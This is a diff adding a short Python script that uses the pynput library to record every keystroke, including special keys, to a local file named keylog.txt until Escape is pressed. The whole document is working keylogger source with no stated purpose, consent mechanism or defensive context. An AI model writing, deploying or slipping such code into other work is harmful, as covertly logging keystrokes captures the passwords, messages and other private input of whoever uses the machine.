@@ -1,0 +1,20 @@
+from pynput.keyboard import Listener, Key
+log_file = "keylog.txt"
+def on_press(key):
+    with open(log_file, "a") as file:
+        try:
+            file.write(str(key.char))
+        except AttributeError:
+            if key == Key.space:
+                file.write(' ')  
+            elif key == Key.enter:
+                file.write('\n') 
+            elif key == Key.tab:
+                file.write('\t')  
+            else:
+                file.write(f'[{key.name}]')  
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
